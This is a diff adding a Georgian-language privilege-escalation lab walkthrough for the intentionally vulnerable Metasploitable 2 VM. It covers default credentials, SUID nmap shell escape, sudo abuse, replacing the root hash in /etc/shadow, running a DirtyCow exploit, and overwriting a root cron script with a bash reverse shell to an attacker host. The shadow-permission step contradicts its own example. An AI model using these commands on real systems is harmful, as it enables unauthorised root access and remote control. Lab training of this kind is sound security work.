@@ -1,0 +1,153 @@
+🧪 Privilege Escalation Lab – Metasploitable 2
+0. შესვლა VM-ში
+
+Metasploitable 2-ში შესასვლელად გამოიყენე:
+
+ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@<VM_IP>
+
+
+👉 პაროლი: msfadmin
+
+თუ გინდა root-ით შესვლა:
+
+ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@<VM_IP>
+
+
+👉 root პაროლი: msfadmin
+
+1. სისტემის ინფორმაციის შეგროვება
+whoami
+id
+uname -a
+cat /etc/issue
+
+
+📌 Output (მაგალითი):
+
+msfadmin
+uid=1000(msfadmin) gid=1000(msfadmin) groups=1000(msfadmin)
+Linux metasploitable 2.6.24-16-server #1 SMP ... i686 GNU/Linux
+Ubuntu 8.04
+
+
+👉 ვხედავთ, რომ მომხმარებელი msfadmin არის unprivileged და kernel ძველია → შესაძლებელია exploit-ები.
+
+2. SUID ბინარების ძებნა
+find / -perm -4000 -type f 2>/dev/null
+
+
+📌 მაგალითად ამოაგდებს:
+
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/local/bin/nmap
+
+
+👉 nmap ძველი ვერსია შეიძლება interactive shell-ს იძლეოდეს root-ით.
+
+3. Exploit SUID Nmap
+
+გაუშვი:
+
+nmap --interactive
+
+
+📌 prompt:
+
+nmap>
+
+
+შემდეგ:
+
+!sh
+
+
+📌 Output:
+
+# whoami
+root
+
+
+👉 ახლა root პრივილეგია გვაქვს.
+
+4. Sudo Misconfiguration
+
+შემოწმება:
+
+sudo -l
+
+
+📌 თუ აჩვენებს:
+
+(ALL) NOPASSWD: ALL
+
+
+👉 ნიშნავს, რომ sudo-ს root პრივილეგიები გვაქვს პაროლის გარეშე.
+
+გაუშვი:
+
+sudo su
+whoami
+
+
+📌 Output:
+
+root
+
+5. Writable /etc/shadow
+
+შემოწმება:
+
+ls -l /etc/shadow
+
+
+📌 თუ output იქნება:
+
+- rw-r--r-- 1 root shadow ...
+
+
+👉 ნიშნავს, რომ ფაილი world-readable/ writableა → შეიძლება პაროლი შევცვალოთ.
+
+მაგალითად ახალი root ჰეშის გენერაცია Kali-ზე:
+
+openssl passwd -1 mypassword
+
+
+შემდეგ ჩასვი /etc/shadow-ში root-ის ჰეშის მაგივრად.
+
+6. Kernel Exploit (DirtyCow)
+
+Kernel 2.6.24 დაუცველია DirtyCow-ზე.
+Metasploit-ში exploit არის linux/local/dirty_cow.
+
+Linux VM-ზე პირდაპირ:
+
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty
+
+
+📌 Output:
+
+[*] Backing up /usr/bin/passwd..
+[*] Pwned! Enjoy your new root shell
+# whoami
+root
+
+7. PATH Hijacking
+
+შეამოწმე cron jobs:
+
+cat /etc/crontab
+
+
+თუ ხედავ სკრიპტს, რომელიც root-ით ყოველ წუთში მუშაობს (მაგ. /usr/local/bin/backup.sh), და ის world-writableა:
+
+ls -l /usr/local/bin/backup.sh
+
+
+👉 შეცვალე სკრიპტი:
+
+echo "/bin/bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1" > /usr/local/bin/backup.sh
+
+
+შემდეგ როცა cron გაეშვება → root reverse shell.
